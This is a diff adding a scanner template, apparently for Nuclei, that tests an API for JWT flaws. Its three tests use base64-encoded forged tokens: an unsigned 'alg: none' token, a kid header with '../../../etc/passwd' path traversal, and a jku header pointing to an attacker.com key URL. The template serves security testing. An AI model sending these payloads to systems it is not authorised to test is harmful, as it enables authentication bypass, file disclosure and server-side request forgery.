@@ -1,0 +1,51 @@
+id: JWT-ADV-01
+name: Advanced JWT Misconfiguration (Algorithm Confusion & Kid Injection)
+severity: high
+category: authentication
+metadata:
+  cwe: CWE-347, CWE-73
+  tags: ["jwt", "alg-none", "kid-injection", "jku-ssrf"]
+
+requests:
+  # Test 1: Accept 'none' algorithm
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/user"
+    headers:
+      Authorization: "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwiaWF0IjoxNTE2MjM5MDIyfQ."
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '"admin"'
+          - '"user":"admin"'
+
+  # Test 2: Kid Path Traversal (Read files via error message)
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/user"
+    headers:
+      Authorization: "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uL2V0Yy9wYXNzd2QifQ.eyJzdWIiOiIxIn0.signature"
+    matchers:
+      - type: word
+        words:
+          - "root:x:"
+          - "failed to load key"
+        part: body
+
+  # Test 3: JKU Header Injection (SSRF / OOB)
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/user"
+    headers:
+      Authorization: "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHA6Ly9hdHRhY2tlci5jb20vd2VsbC1rbm93bi1qd2suanNvbiJ9.eyJzdWIiOiIxIn0.signature"
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "Invalid JWK"
+          - "ConnectionError"
